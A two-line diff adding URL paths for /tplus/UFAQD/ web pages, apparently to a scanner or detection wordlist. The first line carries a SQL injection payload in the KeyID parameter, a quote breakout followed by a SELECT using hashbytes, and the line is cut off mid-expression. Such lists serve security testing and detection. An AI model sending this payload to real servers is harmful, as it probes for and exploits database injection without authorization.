@@ -1,0 +1,2 @@
+/tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(SELECT+sys.fn_varbintohexstr(hashbytes(
+/tplus/UFAQD/KeyInfoList.aspx?preload=1&zt=
